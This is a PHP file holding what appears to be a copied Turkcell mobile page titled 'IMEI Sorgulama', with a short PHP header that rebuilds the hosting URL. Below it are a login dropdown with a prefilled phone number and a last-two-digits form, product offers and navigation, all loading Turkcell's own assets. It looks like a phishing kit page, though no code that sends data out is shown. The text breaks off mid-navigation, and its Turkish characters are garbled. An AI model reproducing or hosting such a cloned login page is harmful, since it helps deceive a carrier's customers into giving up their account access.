<?php 
date_default_timezone_set('Europe/Istanbul');
$actual_link = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$newurl = explode("/", $actual_link);
//print_r($newurl);
$url = "https://";
for($i = 0; $i <= count($newurl)-2; $i++){
    $url .= $newurl[$i]."/";
}
   ?>
<html lang="tr" class=" ">
   <head>
      <link rel="dns-prefetch" href="//s.turkcell.com.tr">
      <meta charset="utf-8">
      <title>IMEI Sorgulama | Turkcell</title>
      <meta http-equiv="X-UA-Compatible" content="ie=edge; chrome=1">
      <meta name="format-detection" content="telephone=no">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
      <meta name="msapplication-tap-highlight" content="no">
      <link rel="shortcut icon" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/images/favicon.ico" type="image/vnd.microsoft.icon">
      <link rel="preload" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/fonts/GreycliffCF-Regular.woff2" as="font" type="font/woff2" crossorigin="">
      <link rel="preload" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/fonts/GreycliffCF-Bold.woff2" as="font" type="font/woff2" crossorigin="">
      <link rel="preload" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/fonts/GreycliffCF-Medium.woff2" as="font" type="font/woff2" crossorigin="">
      <link rel="preload" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/fonts/TurkcellIconFont.woff?1645627466000" as="font" type="font/woff" crossorigin="">
      <link rel="stylesheet" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/styles/vendors.css?1645627466000">
      <link rel="stylesheet" href="https://s.turkcell.com.tr/static_lib/assetsv2/common/styles/vendors/smartbanner.min.css?1645627466000">
      <link rel="stylesheet" href="https://s.turkcell.com.tr/static_lib/assetsv2/mobile/styles/app.mobile.min.css?1645627466000">
   </head>
   <body>
      <script src="https://s.turkcell.com.tr/static_lib/assetsv2/common/scripts/vendors/jquery.min.js?1645627466000"></script>
      <div class="header-bandaid"></div>
      <header class="o-header-mobile o-header-mobile--not-bottom o-header-mobile--pinned o-header-mobile--top">
         <div class="container">
            <div class="o-header-mobile__bar">
               <div class="o-header-mobile__logo">
                  <a class="m-logo" title="Turkcell">
                  <img src="https://s.turkcell.com.tr/static_lib/assetsv2/common/images/content/turkcell-logo.png?1645627466000" alt="Turkcell">
                  </a>
               </div>
               <div class="o-header-mobile__right">
                  <div class="o-header-mobile__buttons">
                     <div class="m-btn-group">
                        <a class="a-btn-icon js-search m-r-0" title="Arama" aria-label="Arama" role="button">
                        <i class="icon-search"></i>
                        </a>
                        <div class="a-user-basket">
                           <a class="a-btn-icon" title="Sepetim" aria-label="Sepetim" role="button">
                           <i class="icon-cart-notification"></i>
                           </a>
                        </div>
                        <a class="a-btn-icon js-login" title="????lem Merkezi" aria-label="????lem Merkezi" role="button">
                        <i class="icon-account-regular"></i>
                        </a>
                        <a class="a-btn-icon js-mobile-nav" title="Menu" role="button" aria-label="Men??">
                        <i class="icon-mobile-menu"></i>
                        </a>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="m-header-dropdown">
            <svg width="0" height="0">
               <defs>
                  <clipPath id="m-header-dropdown__clip-path" clipPathUnits="objectBoundingBox">
                     <path d="M0,0 L0,0.9296875 Q0.5,1.0703125 1,0.9296875 L1,0 Z" stroke-width="0"></path>
                  </clipPath>
                  <clipPath id="m-header-dropdown__clip-path--mobile" clipPathUnits="objectBoundingBox">
                     <path d="M0,0 L0,0.9835051546391752 Q0.5,1.0164948453608247 1,0.9835051546391752 L1,0 Z" stroke-width="0"></path>
                  </clipPath>
               </defs>
            </svg>
            <div class="container">
               <div class="o-header-mobile__login-container js-o-header-mobile-login">
                  <div class="m-login">
                     <input type="hidden" id="redirectUrlAfterLogin" value="/tr/turkcellli-olmak/numara-secimi">
                     <h3 data-title="Giri??">Giri??</h3>
                     <div class="m-login__container">
                        <div class="m-grid">
                           <div class="m-grid-col-10 m-grid-offset-right-2">
                              <div class="m-login__main">
                                 <p>A??a????daki giri?? y??ntemlerinden biriyle giri?? yapabilirsiniz.</p>
                                 <p class="js-login-error color_punch m-t-10"></p>
                                 <div class="m-login__nonpass">
                                    <p>53977151** numaral?? hat ??zerinden internete ba??l??s??n??z. Numaran??z??n son 2 hanesini tu??layarak ??ifresiz giri?? yapabilirsiniz.</p>
                                    <form method="POST" action="/giris/lastTwoDigit" class="m-form" data-parsley-validate="data-parsley-validate" data-parsley-excluded="disabled, :hidden" novalidate="">
                                       <div class="m-form-group ">
                                          <div class="m-form-group__child">
                                             <div class="a-last-numbers" data-numbers="53977151" id="last-number-field">
                                                <div class="a-last-numbers__wrap">
                                                   <div>0539 771 51</div>
                                                   <input name="msisdn" type="tel" required="true" id="last-number-id" placeholder="__" minlength="2" maxlength="2" data-parsley-length-message="Bu alan??n uzunlu??u min. 2 karakter olmal??." data-parsley-errors-container="#last-number-field" data-parsley-class-handler="#last-number-field">
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="m-form-group ">
                                          <div class="m-form-group__child">
                                             <button class="a-btn a-btn--full js-non-pass-btn" title="??ifresiz Giri?? Yap">
                                             ??ifresiz Giri?? Yap
                                             </button>
                                             <span>veya</span>
                                          </div>
                                       </div>
                                    </form>
                                 </div>
                                 <div class="m-form-group  m-login__fast-login">
                                    <div class="m-form-group__child">
                                       <a class="a-btn a-btn--full a-btn--white js-fast-login-btn a-btn--fast-login" href="javascript:;" title="H??zl?? Giri??">
                                       </a>
                                    </div>
                                 </div>
                                 <div class="o-p-header__dropdown__login__continue-anon">
                                    <div class="m-form-group  m-login__footer__go-ahead">
                                       <div class="m-form-group__child">
                                          <span>veya</span>
                                          <a class="a-btn a-btn--full a-btn--secondary a-btn--big a-btn--secondary--white" id="none-login-sale-button" href="javascript:;" title="Giri?? yapmadan devam et">
                                          Giri?? yapmadan devam et
                                          </a>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div class="m-login__form">
                                 <div class="m-login__footer">
                                    <div class="m-login__footer__password-forget">
                                       <div class="m-flex">
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div id="header-mobile-search" class="o-header-mobile__search js-o-header-mobile-search ">
                  <div class="o-header-mobile__search-area">
                     <h2 class="text-center" data-hj-suppress="">Ho?? Geldiniz</h2>
                     <div class="m-search">
                        <form method="GET" action="/arama" class="m-form" data-parsley-validate="data-parsley-validate" data-parsley-excluded="disabled, :hidden" novalidate="">
                           <div class="m-search__input">
                              <button class="a-btn-icon m-search__search" title="">
                              <i class="icon-search"></i>
                              </button>
                              <input type="text" placeholder="Size nas??l yard??mc?? olabiliriz?" name="qx" autocomplete="off" aria-label="Arama yap" value="">
                              <a class="a-btn-icon m-search__cancel" href="javascript:;" title="">
                              <i class="icon-close"></i>
                              </a>
                           </div>
                           <span class="m-search__powered">Powered by Yaani</span>
                        </form>
                        <script class="m-search__result-template" type="text/x-handlebars-template">
                           <div{{#if recommended}} class="m-search__recommended"{{/if}}>
                           			{{#if lvl1Category}}
                             			<span>{{lvl1Category}}{{#if lvl2Category}} - {{lvl2Category}}{{/if}} {{#if lvl3Category}} - {{lvl3Category}}{{/if}} {{#if lvl4Category}} - {{lvl4Category}}{{/if}}</span>
                           			{{/if}}
                           		{{#if title}}
                            				<p>{{title}}</p>
                           			{{/if}}
                           			{{#if recommended}}
                             			<mark>??nerilen sonu??</mark>
                           		 {{/if}}
                           </div>
                        </script>
                        <script class="m-search__all-result-template" type="text/x-handlebars-template">
                           <li>
                           			<a href="/arama?place=autocomplete&qx={{query}}"><div class="m-search__results">T??m Sonu??lar</div></a>
                           </li>
                        </script>
                     </div>
                  </div>
                  <div class="o-header-mobile__tags">
                     <div id="" class="m-slider m-slider--tag">
                        <div class="m-slider__swiper swiper-container swiper-container-initialized swiper-container-horizontal swiper-container-ios">
                           <div class="swiper-wrapper">
                              <div class="swiper-slide swiper-lazy swiper-slide-active" style="margin-right: 16px;">
                                 <a class="a-btn a-btn--tag a-btn--tag--true" href="/yukle/tl-yukle?place=qa" title="TL Y??kle">
                                 TL Y??kle
                                 </a>
                              </div>
                              <div class="swiper-slide swiper-lazy swiper-slide-next" style="margin-right: 16px;">
                                 <a class="a-btn a-btn--tag a-btn--tag--true" href="/yardim/hattiniz/faturali/otomatik-odeme-talimati-nasil-verebilirim" title="
                                    Otomatik ??deme Talimat??">
                                 Otomatik ??deme Talimat??
                                 </a>
                              </div>
                           </div>
                           <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
                        </div>
                     </div>
                  </div>
                  <div id="gomore-recommendedOffers-section" class="o-header-mobile__popular">
                     <h6 class="text-center">??u anda pop??ler</h6>
                     <div id="" class="m-slider">
                        <div class="m-slider__swiper swiper-container swiper-container-initialized swiper-container-horizontal swiper-container-ios">
                           <div class="swiper-wrapper" style="transition-duration: 0ms; transform: translate3d(68.5px, 0px, 0px);">
                              <div class="swiper-slide swiper-lazy swiper-slide-active" style="margin-right: 16px;">
                                 <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-12-64-gb?source=CMS" class="google-analytics-device device-detail-btn m-p-pc  m-p-pc--short" style="" data-product-id="iphone-12-64-gb" data-campaign="campaign,discount," data-href="/pasaj/cep-telefonu/ios-telefonlar/iphone-12-64-gb" data-image-url="https://s.turkcell.com.tr/SiteAssets/Cihaz/cep-telefonu/apple/12/cg/10a.png">
                                    <span class="a-p-card-ribbon a-p-card-ribbon--a a-p-card-ribbon--blue a-p-card-ribbon--red">
                                    1.106 TL ??ndirim
                                    </span>
                                    <div class="a-fav-button" data-url="/pasaj/user-favorite-operation" data-device-path="/pasaj/cep-telefonu/ios-telefonlar/iphone-12-64-gb" data-device-id="1030988" data-pm-name="iPhone 12 64 GB" style="display: none;">
                                       <span class="tooltip tooltipstered" data-alternative="Favoriden ????kar">
                                          <svg class="heart" xmlns="http://www.w3.org/2000/svg" width="36" height="32" viewBox="0 0 36 32">
                                             <path fill="#FFC900" fill-rule="nonzero" stroke="#FFC900" class="heart-line" d="M3.058 2.738l-.104.104C-.983 6.779-.985 13.165 2.95 17.1l12.678 12.678c.847.847 2.213.849 3.062 0L31.368 17.1c3.938-3.938 3.938-10.317-.004-14.258l-.104-.104c-3.654-3.654-9.578-3.65-13.237.009l-.614.614c-.137.137-.363.137-.5 0l-.614-.614C12.638-.91 6.709-.913 3.058 2.738zM15.89 4.38c.7.7 1.836.7 2.536 0l.614-.614c3.097-3.097 8.11-3.1 11.201-.009l.104.104c3.379 3.38 3.38 8.846.004 12.221L17.671 28.76c-.285.285-.74.285-1.024 0L3.968 16.08C.596 12.71.598 7.235 3.972 3.86l.104-.104c3.088-3.088 8.106-3.085 11.2.009l.615.614z" transform="translate(-1254 -352) translate(1255 353)"></path>
                                             <path fill="#ffc900" class="heart-fill" d="M15.994 3.47C12.784.213 7.577.215 4.368 3.47l-.258.262C.48 7.412.48 13.379 4.107 17.056l12.445 12.619c.556.563 1.462.558 2.013 0L31.01 17.056c3.628-3.679 3.629-9.642-.002-13.324l-.26-.263c-3.21-3.255-8.413-3.256-11.625 0l-1.057 1.073c-.28.284-.736.282-1.014 0l-1.058-1.073z" transform="translate(-1254 -352) translate(1239 328) translate(16 25)"></path>
                                          </svg>
                                       </span>
                                    </div>
                                    <div class="m-p-pc__body">
                                       <div class="m-p-pc__carousel">
                                          <figure class="m-p-pc__img">
                                             <img src="https://s.turkcell.com.tr/SiteAssets/Cihaz/cep-telefonu/apple/12/cg/10a/10a_94x71.png" data-src="https://s.turkcell.com.tr/SiteAssets/Cihaz/cep-telefonu/apple/12/cg/10a/10a_94x71.png" alt="" class=" ls-is-cached lazyloaded">
                                          </figure>
                                       </div>
                                       <span class="m-p-pc__title">iPhone 12 64 GB</span>
                                    </div>
                                    <div class="m-p-pc__foot">
                                       <div class="m-p-pc__price m-p-pc__price--primary">
                                          5.391,93
                                          <span class="m-p-pc__price__cur">TL x 3AY</span>
                                       </div>
                                       <div class="m-p-pc__price m-p-pc__price--secondary">
                                          <div class="m-p-pc__price m-p-pc__price--dark">13.893
                                             <span class="m-p-pc__price__cur">TL</span>
                                          </div>
                                          <div class="m-p-pc__price m-p-pc__price--old">14.999
                                             <span class="m-p-pc__price__cur">TL
                                             <span class="m-p-pc__price__cur__discount">1.106 TL ??ndirim</span>
                                             </span>
                                          </div>
                                       </div>
                                    </div>
                                    <!-- google-analytics -->
                                    <div id="google-analytics-device-informations" style="display: none;" data-section-title="Cep Telefonu-Aksesuar" data-product-id="1030988" data-product-name="iPhone 12 64 GB" data-product-price="13893.0" data-product-brand="Apple" data-position="1" data-dimension21="TRY" data-dimension22="true" data-dimension25="Kontratli" data-dimension27="true" data-dimension30="Non-Turkcell" data-dimension156="true" data-dimension157="7.4" data-dimension167="86" data-dimension168="10" data-dimension169="39" data-dimension170="4.91" data-product-category="Cep Telefonu-Aksesuar" data-dimension173="Apple Telefonlar">
                                    </div>
                                    <!-- google-analytics -->
                                 </a>
                              </div>
                              <div class="swiper-slide swiper-lazy swiper-slide-next" style="margin-right: 16px;">
                                 <a href="/pasaj/elektrikli-ev-aletleri/elektrikli-mutfak-aletleri/kahve-makinesi/arzum-ok004-okka-minio-turk-kahvesi-makinesi?source=CMS" class="google-analytics-device device-detail-btn m-p-pc  m-p-pc--short" style="" data-product-id="arzum-ok004-okka-minio-turk-kahvesi-makinesi" data-campaign="campaign,discount," data-href="/pasaj/elektrikli-ev-aletleri/elektrikli-mutfak-aletleri/kahve-makinesi/arzum-ok004-okka-minio-turk-kahvesi-makinesi" data-image-url="https://s.turkcell.com.tr/SiteAssets/Cihaz/aksesuar/arzum/ok004-okka-minio-turk-kahvesi-makinesi/cg/1.png">
                                    <span class="a-p-card-ribbon a-p-card-ribbon--a a-p-card-ribbon--blue a-p-card-ribbon--red">
                                    125 TL ??ndirim
                                    </span>
                                    <div class="a-fav-button" data-url="/pasaj/user-favorite-operation" data-device-path="/pasaj/elektrikli-ev-aletleri/elektrikli-mutfak-aletleri/kahve-makinesi/arzum-ok004-okka-minio-turk-kahvesi-makinesi" data-device-id="1028193" data-pm-name="Arzum OK004 Okka Minio T??rk Kahvesi Makinesi" style="display: none;">
                                       <span class="tooltip tooltipstered" data-alternative="Favoriden ????kar">
                                          <svg class="heart" xmlns="http://www.w3.org/2000/svg" width="36" height="32" viewBox="0 0 36 32">
                                             <path fill="#FFC900" fill-rule="nonzero" stroke="#FFC900" class="heart-line" d="M3.058 2.738l-.104.104C-.983 6.779-.985 13.165 2.95 17.1l12.678 12.678c.847.847 2.213.849 3.062 0L31.368 17.1c3.938-3.938 3.938-10.317-.004-14.258l-.104-.104c-3.654-3.654-9.578-3.65-13.237.009l-.614.614c-.137.137-.363.137-.5 0l-.614-.614C12.638-.91 6.709-.913 3.058 2.738zM15.89 4.38c.7.7 1.836.7 2.536 0l.614-.614c3.097-3.097 8.11-3.1 11.201-.009l.104.104c3.379 3.38 3.38 8.846.004 12.221L17.671 28.76c-.285.285-.74.285-1.024 0L3.968 16.08C.596 12.71.598 7.235 3.972 3.86l.104-.104c3.088-3.088 8.106-3.085 11.2.009l.615.614z" transform="translate(-1254 -352) translate(1255 353)"></path>
                                             <path fill="#ffc900" class="heart-fill" d="M15.994 3.47C12.784.213 7.577.215 4.368 3.47l-.258.262C.48 7.412.48 13.379 4.107 17.056l12.445 12.619c.556.563 1.462.558 2.013 0L31.01 17.056c3.628-3.679 3.629-9.642-.002-13.324l-.26-.263c-3.21-3.255-8.413-3.256-11.625 0l-1.057 1.073c-.28.284-.736.282-1.014 0l-1.058-1.073z" transform="translate(-1254 -352) translate(1239 328) translate(16 25)"></path>
                                          </svg>
                                       </span>
                                    </div>
                                    <div class="m-p-pc__body">
                                       <div class="m-p-pc__carousel">
                                          <figure class="m-p-pc__img">
                                             <img src="https://s.turkcell.com.tr/SiteAssets/Cihaz/aksesuar/arzum/ok004-okka-minio-turk-kahvesi-makinesi/cg/1/1_94x71.png" data-src="https://s.turkcell.com.tr/SiteAssets/Cihaz/aksesuar/arzum/ok004-okka-minio-turk-kahvesi-makinesi/cg/1/1_94x71.png" alt="" class=" ls-is-cached lazyloaded">
                                          </figure>
                                       </div>
                                       <span class="m-p-pc__title">Arzum OK004 Okka Minio T??rk Kahvesi Makinesi</span>
                                    </div>
                                    <div class="m-p-pc__foot">
                                       <div class="m-p-pc__price m-p-pc__price--primary">
                                          36,42
                                          <span class="m-p-pc__price__cur">TL x 36AY</span>
                                       </div>
                                       <div class="m-p-pc__price m-p-pc__price--secondary">
                                          <div class="m-p-pc__price m-p-pc__price--dark">474
                                             <span class="m-p-pc__price__cur">TL</span>
                                          </div>
                                          <div class="m-p-pc__price m-p-pc__price--old">599
                                             <span class="m-p-pc__price__cur">TL
                                             <span class="m-p-pc__price__cur__discount">125 TL ??ndirim</span>
                                             </span>
                                          </div>
                                       </div>
                                    </div>
                                    <!-- google-analytics -->
                                    <div id="google-analytics-device-informations" style="display: none;" data-section-title="Elektrikli Ev Aletleri" data-product-id="1028193" data-product-name="Arzum OK004 Okka Minio T??rk Kahvesi Makinesi" data-product-price="474.0" data-product-brand="Arzum" data-position="1" data-dimension21="TRY" data-dimension22="true" data-dimension25="Kontratli" data-dimension27="true" data-dimension30="Non-Turkcell" data-dimension156="true" data-dimension157="20.9" data-dimension167="104" data-dimension168="4" data-dimension169="10" data-dimension170="4.97" data-product-category="Elektrikli Ev Aletleri" data-dimension173="Elektrikli Mutfak Aletleri" data-dimension174="Kahve Makineleri">
                                    </div>
                                    <!-- google-analytics -->
                                 </a>
                              </div>
                              <div class="swiper-slide swiper-lazy" style="margin-right: 16px;">
                                 <a class="m-card m-card--package m-card--short" href="/paket-ve-tarifeler/yeni-musteri-paketleri/turbo-firsat-avantaj-plus?source=CMS" data-component="">
                                    <div class="m-card__head__short-hat" style="background: #009ed8 radial-gradient(circle at -2.5rem 0,#00b3e3 40%,rgba(0,179,227,.75) 40%,rgba(0,179,227,.75) 60%,rgba(0,179,227,.5) 60%,rgba(0,179,227,.5) 85%,rgba(0,0,0,0) 85%);
                                       color: #fff;"></div>
                                    <div class="m-card__head" style="background: #009ed8 radial-gradient(circle at -2.5rem 0,#00b3e3 40%,rgba(0,179,227,.75) 40%,rgba(0,179,227,.75) 60%,rgba(0,179,227,.5) 60%,rgba(0,179,227,.5) 85%,rgba(0,0,0,0) 85%);
                                       color: #fff;">
                                       <h3 class="m-card__title">Turbo F??rsat Avantaj+</h3>
                                    </div>
                                    <div class="m-card__body">
                                       <div class="m-card__packages">
                                       </div>
                                       <div class="m-card__tariffs">
                                          <div class="a-tariff">
                                             <i class="a-icon icon-cellular"></i>
                                             <div class="a-tariff__data">5<sup>GB</sup></div>
                                             <div class="a-tariff__name">??NTERNET</div>
                                          </div>
                                          <div class="a-tariff">
                                             <i class="a-icon icon-telephone"></i>
                                             <div class="a-tariff__data">500<sup>DK</sup></div>
                                             <div class="a-tariff__name">HER Y??NE</div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="m-card__foot">
                                       <div class="m-flex">
                                          <span class="a-price  a-price--gray">
                                          <span class="a-price-val">66</span>
                                          <sup>
                                          <span class="a-price__currency">TL/AY</span>
                                          </sup>
                                          </span>
                                       </div>
                                    </div>
                                 </a>
                              </div>
                           </div>
                           <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="a-lottie-animation a-lottie-animation--loading" data-animation="Loading">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1230 1230" width="1230" height="1230" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
                  <defs>
                     <clipPath id="__lottie_element_2">
                        <rect width="1230" height="1230" x="0" y="0"></rect>
                     </clipPath>
                  </defs>
                  <g clip-path="url(#__lottie_element_2)">
                     <g style="display: none;">
                        <g>
                           <path></path>
                        </g>
                     </g>
                     <g transform="matrix(0,0,0,0,620.510009765625,617.448974609375)" opacity="0.66" style="display: block;">
                        <g opacity="1" transform="matrix(2,0,0,2,0,0)">
                           <path fill="rgb(26,94,167)" fill-opacity="0.88" d=" M0,-494 C272.63861083984375,-494 494,-272.63861083984375 494,0 C494,272.63861083984375 272.63861083984375,494 0,494 C-272.63861083984375,494 -494,272.63861083984375 -494,0 C-494,-272.63861083984375 -272.63861083984375,-494 0,-494z"></path>
                        </g>
                     </g>
                     <g transform="matrix(0,0,0,0,620.510009765625,617.448974609375)" opacity="1" style="display: block;">
                        <g opacity="1" transform="matrix(2,0,0,2,0,0)">
                           <path fill="rgb(22,109,177)" fill-opacity="0.58" d=" M0,-333 C183.78269958496094,-333 333,-183.78269958496094 333,0 C333,183.78269958496094 183.78269958496094,333 0,333 C-183.78269958496094,333 -333,183.78269958496094 -333,0 C-333,-183.78269958496094 -183.78269958496094,-333 0,-333z"></path>
                        </g>
                     </g>
                     <g style="display: none;">
                        <g>
                           <path></path>
                        </g>
                     </g>
                     <g style="display: none;">
                        <g>
                           <path></path>
                        </g>
                     </g>
                     <g transform="matrix(0,0,0,0,620.510009765625,617.448974609375)" opacity="1" style="display: block;">
                        <g opacity="1" transform="matrix(2,0,0,2,0,0)">
                           <path fill="rgb(40,54,135)" fill-opacity="0.31" d=" M0,-113 C62.36470031738281,-113 113,-62.36470031738281 113,0 C113,62.36470031738281 62.36470031738281,113 0,113 C-62.36470031738281,113 -113,62.36470031738281 -113,0 C-113,-62.36470031738281 -62.36470031738281,-113 0,-113z"></path>
                        </g>
                     </g>
                     <g transform="matrix(0,0,0,0,620.510009765625,617.448974609375)" opacity="1" style="display: block;">
                        <g opacity="1" transform="matrix(2,0,0,2,0,0)">
                           <path fill="rgb(255,200,0)" fill-opacity="1" d=" M43.0099983215332,-61.189998626708984 C35.119998931884766,-66.70999908447266 26.079999923706055,-70.6500015258789 15.9399995803833,-72.98999786376953 C-0.6899999976158142,-76.83999633789062 -16.8700008392334,-75.0999984741211 -32.459999084472656,-68.22000122070312 C-41.08000183105469,-64.41000366210938 -48.709999084472656,-59.16999816894531 -55.27000045776367,-52.4900016784668 C-63.470001220703125,-44.15999984741211 -69.4000015258789,-34.709999084472656 -73.01000213623047,-24.170000076293945 C-73.2300033569336,-23.510000228881836 -73.33999633789062,-23.139999389648438 -73.45999908447266,-22.760000228881836 C-77.16000366210938,-10.569999694824219 -73.69999694824219,-3.8399999141693115 -68.26000213623047,-9.479999542236328 C-68.05000305175781,-9.720000267028809 -67.83000183105469,-9.960000038146973 -67.61000061035156,-10.199999809265137 C-61,-18.389999389648438 -50.869998931884766,-24.969999313354492 -50.869998931884766,-24.969999313354492 C-48.290000915527344,-26.739999771118164 -45.61000061035156,-28.389999389648438 -42.81999969482422,-29.93000030517578 C-39.63999938964844,-31.770000457763672 -36.310001373291016,-33.459999084472656 -33.20000076293945,-34.599998474121094 C-33.20000076293945,-34.599998474121094 -30.31999969482422,-35.900001525878906 -29.549999237060547,-39.86000061035156 C-28.959999084472656,-43.4900016784668 -25.3799991607666,-52.560001373291016 -15.25,-53.150001525878906 C-12.079999923706055,-53.58000183105469 -8.930000305175781,-53.02000045776367 -6.150000095367432,-51.720001220703125 C-1.2599999904632568,-49.43000030517578 2.4800000190734863,-44.84000015258789 3.240000009536743,-39.310001373291016 C3.8499999046325684,-34.91999816894531 2.7799999713897705,-30.770000457763672 0.5099999904632568,-27.489999771118164 C0.3799999952316284,-27.309999465942383 0.23999999463558197,-27.1200008392334 0.09000000357627869,-26.93000030517578 C-1.9500000476837158,-24.329999923706055 -4.550000190734863,-22.450000762939453 -7.659999847412109,-21.389999389648438 C-9.520000457763672,-20.709999084472656 -11.40999984741211,-20.3700008392334 -13.220000267028809,-20.31999969482422 C-14.369999885559082,-20.170000076293945 -15.630000114440918,-20.31999969482422 -16.889999389648438,-20.6200008392334 C-18.31999969482422,-20.90999984741211 -19.6299991607666,-21.3799991607666 -20.760000228881836,-22.010000228881836 C-22.709999084472656,-22.90999984741211 -24.299999237060547,-23.93000030517578 -24.889999389648438,-24.459999084472656 C-25.350000381469727,-24.8799991607666 -25.850000381469727,-25.110000610351562 -26.329999923706055,-25.229999542236328 C-27.399999618530273,-25.399999618530273 -28.270000457763672,-25.200000762939453 -28.90999984741211,-24.93000030517578 C-29.280000686645508,-24.770000457763672 -29.559999465942383,-24.59000015258789 -29.760000228881836,-24.450000762939453 C-32.18000030517578,-22.450000762939453 -34.4900016784668,-20.360000610351562 -36.68000030517578,-18.170000076293945 C-42.41999816894531,-12.210000038146973 -47.2400016784668,-5.449999809265137 -49.5099983215332,-2.109999895095825 C-50.709999084472656,-0.20999999344348907 -51.849998474121094,1.7200000286102295 -52.91999816894531,3.7200000286102295 C-53.90999984741211,5.570000171661377 -54.84000015258789,7.440000057220459 -55.70000076293945,9.319999694824219 C-57.040000915527344,12.3100004196167 -58.310001373291016,15.520000457763672 -59.439998626708984,18.969999313354492 C-59.4900016784668,19.1299991607666 -59.54999923706055,19.290000915527344 -59.599998474121094,19.440000534057617 C-59.66999816894531,19.65999984741211 -59.7400016784668,19.8799991607666 -59.79999923706055,20.100000381469727 C-59.869998931884766,20.31999969482422 -59.93000030517578,20.530000686645508 -60,20.75 C-66.97000122070312,44.29999923706055 -54.41999816894531,57.88999938964844 -43.90999984741211,43.689998626708984 C-43.33000183105469,42.790000915527344 -42.75,41.900001525878906 -42.150001525878906,41.0099983215332 C-31.110000610351562,22.170000076293945 -8.510000228881836,8.59000015258789 -8.510000228881836,8.59000015258789 C-7.110000133514404,7.71999979019165 -5.710000038146973,6.889999866485596 -4.300000190734863,6.079999923706055 C-0.15000000596046448,3.740000009536743 3.8299999237060547,1.7799999713897705 7.929999828338623,0.05999999865889549 C11.579999923706055,-1.5399999618530273 15.449999809265137,-3.0299999713897705 18.670000076293945,-3.799999952316284 C18.670000076293945,-3.799999952316284 22.43000030517578,-4.769999980926514 23.440000534057617,-9.34000015258789 C24.170000076293945,-12.619999885559082 26.56999969482422,-17.420000076293945 32.02000045776367,-20 C33.29999923706055,-20.639999389648438 34.63999938964844,-21.1299991607666 35.9900016784668,-21.420000076293945 C37.45000076293945,-21.739999771118164 38.90999984741211,-21.860000610351562 40.33000183105469,-21.790000915527344 C41.27000045776367,-21.809999465942383 42.04999923706055,-21.709999084472656 42.720001220703125,-21.510000228881836 C49.619998931884766,-20.200000762939453 55.279998779296875,-14.609999656677246 56.099998474121094,-7.239999771118164 C57.099998474121094,1.7000000476837158 50.810001373291016,9.770000457763672 41.79999923706055,10.880000114440918 C37.310001373291016,11.430000305175781 33.25,10.470000267028809 29.780000686645508,7.880000114440918 C25.889999389648438,6.28000020980835 22.899999618530273,7.300000190734863 21.81999969482422,7.800000190734863 C18.43000030517578,9.630000114440918 15.170000076293945,11.649999618530273 12.0600004196167,13.880000114440918 C6.260000228881836,18.1200008392334 1.659999966621399,22.549999237060547 -0.17000000178813934,24.3799991607666 C-4.170000076293945,28.469999313354492 -7.71999979019165,32.81999969482422 -10.789999961853027,37.41999816894531 C-10.949999809265137,37.66999816894531 -11.119999885559082,37.91999816894531 -11.279999732971191,38.18000030517578 C-14.579999923706055,43.36000061035156 -17.940000534057617,49.72999954223633 -20.719999313354492,57.43000030517578 C-20.93000030517578,58.040000915527344 -21.139999389648438,58.630001068115234 -21.329999923706055,59.2400016784668 C-24.299999237060547,69.12999725341797 -17.8700008392334,73.06999969482422 -10.4399995803833,74.5 C-9.260000228881836,74.63999938964844 -8.079999923706055,74.76000213623047 -6.889999866485596,74.8499984741211 C-6.599999904632568,74.87000274658203 -6.309999942779541,74.94999694824219 -6.019999980926514,75 C-6.019999980926514,75 3.7699999809265137,75 3.7699999809265137,75 C4.260000228881836,74.95999908447266 4.699999809265137,74.91999816894531 5.070000171661377,74.87999725341797 C7.190000057220459,74.62000274658203 9.3100004196167,74.4000015258789 11.40999984741211,74.05000305175781 C25.8799991607666,71.61000061035156 38.66999816894531,65.66000366210938 49.59000015258789,55.970001220703125 C63.34000015258789,43.779998779296875 71.62000274658203,28.600000381469727 74.19999694824219,10.5600004196167 C76.7699966430664,-7.510000228881836 73.16000366210938,-24.450000762939453 63.25,-39.880001068115234 C57.66999816894531,-48.560001373291016 50.90999984741211,-55.66999816894531 43.0099983215332,-61.189998626708984z"></path>
                        </g>
                     </g>
                  </g>
               </svg>
            </div>
            <div class="m-header-dropdown__close"></div>
         </div>
      </header>
      <div class="m-cookie">
         <div class="container">
            <span>
            Sitemizde bilgi toplumu hizmetlerinin sunulmas?? amac??yla ??erez kullan??lmaktad??r. Ayd??nlatma metnine eri??mek i??in <a href="/tr/gizlilik-ve-guvenlik?page=gizlilik-guvenlik#cerez-politikasi">?????erez Politikas?????</a> sayfam??z?? ziyaret edebilirsiniz.
            </span>
            <a href="javascript:;" class="js-close-cookie">
            <i class="a-icon icon-close"></i>
            </a>
         </div>
      </div>
      <div class="m-mobile-nav ">
         <div class="m-mobile-nav__top">
            <a class="m-logo" href="/" title="Turkcell">
            <img src="https://s.turkcell.com.tr/static_lib/assetsv2/common/images/content/turkcell-logo.png?1645627466000" alt="Turkcell">
            </a>
            <a class="a-btn-icon js-mobile-nav--close" href="javascript:;" title="Kapat" role="button" aria-label="Men??y?? kapat">
            <i class="icon-close"></i>
            </a>
         </div>
         <div class="m-mobile-nav__content">
            <nav>
               <ul>
                  <li class="">
                     <a class="" href="/pasaj?place=menu" data-index="0" title="Pasaj">
